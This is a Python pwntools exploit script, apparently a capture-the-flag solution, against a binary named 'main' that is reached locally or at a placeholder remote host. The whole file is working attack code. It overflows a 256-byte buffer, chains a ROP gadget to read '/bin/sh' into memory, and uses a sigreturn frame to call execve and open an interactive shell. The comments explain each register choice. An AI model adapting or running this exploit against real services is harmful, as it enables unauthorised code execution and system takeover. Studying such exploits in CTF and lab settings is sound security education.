#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r




frame = SigreturnFrame()
frame.rax = 59 # execve syscall number
frame.rdi = 0x402000  # banner address (/bin/sh\0)
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x000000000040102c   #syscall address




def main():
    r = conn()
    r.recv()


    payload = flat(
         "\x00" * (256),
         p64(0x401035), # pop rbx ; pop rdx ; pop rsi ; push 0 ; pop rdi ; push 0 ; pop rax ; syscall .... - > gadget to control rbx,rdx and rdi registers then put 0 in rax and call syscall to call read function) 
         p64(0x40102b), # RBX value - > return address to the sig return syscall (read function)
         p64(0x10), # RDX value - > size of the read buffer
         p64(0x402000), # RSI value - > Address of banner 
         p64(15), # RAX value - > syscall number for sig return
         frame # Signal frame

        )


    # gdb.attach(r,"b *authenticate + 25")
    r.sendline(payload)
    r.sendline("/bin/sh\0") # Sending it in read function to Override the first 8 bytes of the banner with the string "/bin/sh\0"
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
